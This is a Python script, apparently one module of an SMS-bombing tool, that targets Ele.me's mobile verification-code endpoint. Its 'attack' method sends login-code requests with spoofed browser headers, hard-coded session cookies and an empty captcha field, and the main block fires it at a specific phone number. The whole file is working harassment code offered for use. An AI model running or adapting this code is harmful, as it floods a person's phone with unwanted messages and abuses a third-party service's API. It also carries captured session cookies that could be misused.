import os

import requests

from util.utils import HttpUtils


class eleme:
    def open(self):
        session = requests.Session()
        base_url = "https://h5.ele.me/login/#redirect=https%3A%2F%2Fwww.ele.me%2Fhome%2F&page=message"

        res = HttpUtils.get(session=session, url=base_url)
        print(res)
        print(session.cookies)

    def attack(self, phone_number):
        base_url = "https://restapi.ele.me/v4/mobile/verify_code/send"

        headers = {
            "User-Agent":
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2,ja;q=0.2",
            "Connection": "keep-alive",
            "content-type": "application/json; charset=utf-8",
            "DNT": "1",
            "Origin": "https://h5.ele.me",
            "Referer": "https://h5.ele.me/login/",
            "Host": "restapi.ele.me",
            "X-Eleme-RequestID": "39DFA655C0D9F07D71ADDE92E8291746|1505487170009"
        }

        session = requests.Session()
        cookie = {"ubt_ssid": "hzt9ld0hoiolnddc8blx4y7mx1h2gow9_2017-08-19",
                  "_utrace": "8404a75180ab042fd7be77441a17bfb4_2017-08-19",
                  "perf_ssid": "53cis08c6yvit12zft0oohf4vwgmfjwq_2017-08-19",
                  "eleme__ele_me": "d24e1c9d5a1d5a3cae35c8d53b8168dd%3Ad749197a8cb636a6bea00688267fb9ded8664be2",
                  "track_id": "1503100623%7C4e4fbcf91856d5ccef4f61c6651e134c56af6dc85da1f94211%7C42e9993191100f5f52b23191fa571da7"}
        requests.utils.add_dict_to_cookiejar(session.cookies, cookie)

        res = HttpUtils.post(base_url, session=session, data=self.build_post_data(phone_number),
                             headers=headers, returnRaw=False)
        print(res)

    def build_post_data(self, phone_number):
        data = dict()
        data['captcha_code'] = ""
        data['mobile'] = phone_number
        data['scene'] = "login"
        data['type'] = "sms"

        return data

if __name__ == "__main__":
    eleme = eleme()
    eleme.attack("13764980366")
